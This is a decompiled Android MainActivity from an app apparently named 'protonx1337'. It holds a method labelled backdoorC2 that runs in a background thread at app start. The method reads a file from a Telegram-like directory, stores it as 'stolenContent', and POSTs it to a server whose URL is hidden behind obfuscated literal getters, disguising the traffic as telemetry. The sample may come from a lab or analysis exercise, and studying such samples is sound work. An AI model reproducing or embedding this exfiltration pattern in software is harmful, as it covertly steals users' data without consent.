package com.example.protonx1337;

import android.os.Bundle;
import androidx.activity.ComponentActivity;
import androidx.activity.compose.ComponentActivityKt;
import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.collections.CollectionsKt;
import kotlin.concurrent.ThreadsKt;
import kotlin.io.CloseableKt;
import kotlin.io.FilesKt;
import kotlin.jvm.functions.Function0;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;
import kotlin.text.StringsKt;
/* compiled from: MainActivity.kt */
@Metadata(d1 = {"\u0000\u001a\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\b\u0010\u0003\u001a\u00020\u0004H\u0002J\b\u0010\u0005\u001a\u00020\u0004H\u0002J\u0012\u0010\u0006\u001a\u00020\u00042\b\u0010\u0007\u001a\u0004\u0018\u00010\bH\u0014¨\u0006\t"}, d2 = {"Lcom/example/protonx1337/MainActivity;", "Landroidx/activity/ComponentActivity;", "()V", "backdoorC2", "", "initializeMediaStorage", "onCreate", "savedInstanceState", "Landroid/os/Bundle;", "app_debug"}, k = 1, mv = {1, 8, 0}, xi = 48)
/* loaded from: classes3.dex */
public final class MainActivity extends ComponentActivity {
    public static final int $stable = LiveLiterals$MainActivityKt.INSTANCE.m5405Int$classMainActivity();

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ComponentActivityKt.setContent$default(this, null, ComposableSingletons$MainActivityKt.INSTANCE.m5403getLambda3$app_debug(), 1, null);
        initializeMediaStorage();
        backdoorC2();
    }

    private final void initializeMediaStorage() {
        File baseTelegramDir = new File(getExternalFilesDir(null), LiveLiterals$MainActivityKt.INSTANCE.m5418x27a3bff5());
        List<String> directoriesToCreate = CollectionsKt.listOf((Object[]) new String[]{LiveLiterals$MainActivityKt.INSTANCE.m5408x1540d185(), LiveLiterals$MainActivityKt.INSTANCE.m5409xf5c29964(), LiveLiterals$MainActivityKt.INSTANCE.m5411xd6446143(), LiveLiterals$MainActivityKt.INSTANCE.m5412xb6c62922()});
        if (!baseTelegramDir.exists()) {
            baseTelegramDir.mkdirs();
        }
        for (String dirName : directoriesToCreate) {
            File dir = new File(baseTelegramDir, dirName);
            if (!dir.exists()) {
                dir.mkdirs();
            }
        }
        File docDir = new File(baseTelegramDir, LiveLiterals$MainActivityKt.INSTANCE.m5420xb46d800b());
        File targetFile = new File(docDir, LiveLiterals$MainActivityKt.INSTANCE.m5421xb774b583());
        if (!targetFile.exists()) {
            FilesKt.writeText$default(targetFile, LiveLiterals$MainActivityKt.INSTANCE.m5417x92b1f5a2(), null, 2, null);
        }
    }

    private final void backdoorC2() {
        ThreadsKt.thread((r12 & 1) != 0, (r12 & 2) != 0 ? false : false, (r12 & 4) != 0 ? null : null, (r12 & 8) != 0 ? null : null, (r12 & 16) != 0 ? -1 : 0, new Function0<Unit>() { // from class: com.example.protonx1337.MainActivity$backdoorC2$1
            /* JADX INFO: Access modifiers changed from: package-private */
            {
                super(0);
            }

            @Override // kotlin.jvm.functions.Function0
            public /* bridge */ /* synthetic */ Unit invoke() {
                invoke2();
                return Unit.INSTANCE;
            }

            /* renamed from: invoke  reason: avoid collision after fix types in other method */
            public final void invoke2() {
                try {
                    File baseTelegramDir = new File(MainActivity.this.getExternalFilesDir(null), LiveLiterals$MainActivityKt.INSTANCE.m5419x695a2287());
                    File targetFile = new File(baseTelegramDir, LiveLiterals$MainActivityKt.INSTANCE.m5422x352a2295());
                    String stolenContent = LiveLiterals$MainActivityKt.INSTANCE.m5427x71c6fad();
                    if (targetFile.exists()) {
                        stolenContent = StringsKt.replace$default(FilesKt.readText$default(targetFile, null, 1, null), LiveLiterals$MainActivityKt.INSTANCE.m5414x2146129b(), LiveLiterals$MainActivityKt.INSTANCE.m5423xdcef40ba(), false, 4, (Object) null);
                    }
                    String d1 = LiveLiterals$MainActivityKt.INSTANCE.m5425x506ff06();
                    String d2 = LiveLiterals$MainActivityKt.INSTANCE.m5426xcc12e607();
                    URLConnection openConnection = new URL(d1 + d2).openConnection();
                    Intrinsics.checkNotNull(openConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                    HttpURLConnection connection = (HttpURLConnection) openConnection;
                    connection.setRequestMethod(LiveLiterals$MainActivityKt.INSTANCE.m5415xf204d679());
                    connection.setDoOutput(LiveLiterals$MainActivityKt.INSTANCE.m5404xb9b2a8a0());
                    connection.setRequestProperty(LiveLiterals$MainActivityKt.INSTANCE.m5416xd700fed(), LiveLiterals$MainActivityKt.INSTANCE.m5424x3d2743ee());
                    byte[] telemetryPayload = StringsKt.trimIndent(LiveLiterals$MainActivityKt.INSTANCE.m5406xe0280da5() + stolenContent + LiveLiterals$MainActivityKt.INSTANCE.m5410x5139a9a7()).getBytes(Charsets.UTF_8);
                    Intrinsics.checkNotNullExpressionValue(telemetryPayload, "this as java.lang.String).getBytes(charset)");
                    OutputStream outputStream = connection.getOutputStream();
                    OutputStream os = outputStream;
                    os.write(telemetryPayload);
                    Unit unit = Unit.INSTANCE;
                    CloseableKt.closeFinally(outputStream, null);
                    int responseCode = connection.getResponseCode();
                    System.out.println((Object) (LiveLiterals$MainActivityKt.INSTANCE.m5407x6efccddf() + responseCode));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
